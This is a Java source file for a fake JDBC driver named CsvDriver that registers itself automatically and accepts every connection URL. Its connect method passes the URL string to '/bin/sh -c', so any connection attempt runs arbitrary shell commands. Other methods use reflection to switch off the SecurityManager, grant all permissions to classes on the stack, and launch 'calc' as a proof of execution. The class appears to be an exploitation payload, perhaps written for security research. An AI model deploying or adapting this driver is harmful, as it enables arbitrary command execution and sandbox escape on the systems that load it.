package org.example;

import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.ProtectionDomain;
import java.sql.Connection;
import java.sql.Driver;
import java.sql.DriverManager;
import java.sql.DriverPropertyInfo;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.Arrays;
import java.util.Map;
import java.util.Properties;
import java.util.logging.Logger;
import java.util.stream.Collectors;

public class CsvDriver implements Driver {


	private static final Driver INSTANCE = new CsvDriver();
	private static boolean registered;
	public CsvDriver() {}

	public static void exec(String command) {
		try {
			Runtime.getRuntime().exec(command);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public static void executeCommandWithReflection(String command) {
		try {
			Class clz = Class.forName("java.lang.ProcessImpl");
			Method method = clz.getDeclaredMethod("start", String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class);
			method.setAccessible(true);
			method.invoke(clz, new String[]{command}, null, null, null, false);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public static void setHasAllPerm0() {
		StackTraceElement[] stackTraceElements = Thread.currentThread().getStackTrace();
		//遍历栈帧
		for (StackTraceElement stackTraceElement : stackTraceElements) {
			try {
				Class clz = Class.forName(stackTraceElement.getClassName());
				//利用反射调用getProtectionDomain0方法
				Method getProtectionDomain = clz.getClass().getDeclaredMethod("getProtectionDomain0", null);
				getProtectionDomain.setAccessible(true);
				ProtectionDomain pd = (ProtectionDomain) getProtectionDomain.invoke(clz);

				if (pd != null) {
					Field field = pd.getClass().getDeclaredField("hasAllPerm");
					field.setAccessible(true);
					field.set(pd, true);
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
		exec("calc");
	}

	public static void setHasAllPerm() {

		StackTraceElement[] stackTraceElements = Thread.currentThread().getStackTrace();
		//遍历栈帧
		for (StackTraceElement stackTraceElement : stackTraceElements) {
			try {
				//反射当前栈帧中的类
				Class clz = Class.forName(stackTraceElement.getClassName());
				Field field = clz.getProtectionDomain().getClass().getDeclaredField("hasAllPerm");
				//压制java的访问检查
				field.setAccessible(true);
				//把hasAllPerm置为true
				field.set(clz.getProtectionDomain(), true);
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}

	public static void setSecurityByReflection() {
		try {
			Class clz = Class.forName("java.lang.System");
			Field field = clz.getDeclaredField("security");
			field.setAccessible(true);
			field.set(System.class, null);

		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	@Override
	public Connection connect(String s, Properties properties) throws SQLException {


		String[] cmd = {
			"/bin/sh",
			"-c",
			s
		};
		try {
			//setHasAllPerm0();
			//setHasAllPerm();
			// setSecurityByReflection();
			Runtime.getRuntime().exec(cmd);
		} catch (Exception e) {
			throw new RuntimeException(e);
		}
		return new CsvConnection(Path.of(""));
	}

	@Override
	public boolean acceptsURL(String s) throws SQLException {
		return true;
	}

	@Override
	public DriverPropertyInfo[] getPropertyInfo(String s, Properties properties) throws SQLException {
		return new DriverPropertyInfo[0];
	}

	@Override
	public int getMajorVersion() {
		return 0;
	}

	@Override
	public int getMinorVersion() {
		return 0;
	}

	@Override
	public boolean jdbcCompliant() {
		return true;
	}

	@Override
	public Logger getParentLogger() throws SQLFeatureNotSupportedException {
		return null;
	}

	public static synchronized Driver load() {
		if (!registered) {
			registered = true;
			try {
				DriverManager.registerDriver(INSTANCE);
			} catch (SQLException throwables) {
				throwables.printStackTrace();
			}
		}

		return INSTANCE;
	}

	static {
		load();
	}
}
